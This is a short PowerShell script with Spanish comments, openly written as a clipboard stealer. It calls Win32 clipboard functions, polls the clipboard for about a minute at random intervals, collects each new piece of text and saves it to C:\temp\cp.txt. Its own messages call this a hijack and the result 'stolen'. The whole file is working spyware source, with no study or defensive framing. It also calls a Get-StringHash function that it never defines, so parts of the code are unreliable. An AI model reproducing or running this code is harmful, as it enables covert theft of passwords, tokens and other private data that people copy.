# clipboard-ultra-stealth-save.ps1
# 100% en memoria + guarda al final en C:\temp\cp.txt
# Crea la carpeta si no existe

Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.IO;

public class Win32 {
    [DllImport("user32.dll")] public static extern bool OpenClipboard(IntPtr hWndNewOwner);
    [DllImport("user32.dll")] public static extern IntPtr GetClipboardData(uint uFormat);
    [DllImport("user32.dll")] public static extern bool CloseClipboard();
    [DllImport("kernel32.dll")] public static extern IntPtr GlobalLock(IntPtr hMem);
    [DllImport("kernel32.dll")] public static extern bool GlobalUnlock(IntPtr hMem);
    public const uint CF_UNICODETEXT = 13;
}
"@

# Crear carpeta C:\temp si no existe (silencioso)
$logPath = "C:\temp\cp.txt"
$logDir  = Split-Path $logPath -Parent
if (-not (Test-Path $logDir)) { New-Item -ItemType Directory -Path $logDir -Force | Out-Null }

$exfil = [System.Collections.Generic.List[string]]::new()
$seen  = @{}

Write-Host "[*] Clipboard hijack activo → todo se guardará en C:\temp\cp.txt" -ForegroundColor Cyan

for ($i = 0; $i -lt 60; $i++) {
    if ([Win32]::OpenClipboard([IntPtr]::Zero)) {
        $h = [Win32]::GetClipboardData(13)
        if ($h -ne [IntPtr]::Zero) {
            $p = [Win32]::GlobalLock($h)
            $text = [Runtime.InteropServices.Marshal]::PtrToStringUni($p)
            [Win32]::GlobalUnlock($h)

            if ($text -and $text.Trim().Length -gt 4) {
                $hash = (Get-StringHash $text "MD5")
                if (-not $seen.ContainsKey($hash)) {
                    $seen[$hash] = $true
                    $line = "[$(Get-Date -Format "HH:mm:ss")] $text"
                    $exfil.Add($line)
                    $preview = ($text -replace "[\r\n\t]+", " ").Substring(0, [Math]::Min(80, $text.Length))
                    Write-Host "[+] $preview..." -ForegroundColor Yellow
                }
            }
        }
        [Win32]::CloseClipboard()
    }
    Start-Sleep -Milliseconds (800..1800 | Get-Random)
}

# GUARDAR EN DISCO AL FINAL
if ($exfil.Count -gt 0) {
    $exfil | Out-File -FilePath $logPath -Encoding UTF8 -Force
    Write-Host "`n[+] Todo robado guardado en: $logPath" -ForegroundColor Red
    Write-Host "   → $($exfil.Count) elementos únicos capturados" -ForegroundColor Gray
} else {
    "[-] Nada capturado durante el minuto" | Out-File -FilePath $logPath -Encoding UTF8
    Write-Host "Nada capturado → archivo vacío creado igualmente" -ForegroundColor DarkGray
}

# Opcional: abrir el archivo automáticamente (para pruebas)
# Invoke-Item $logPath
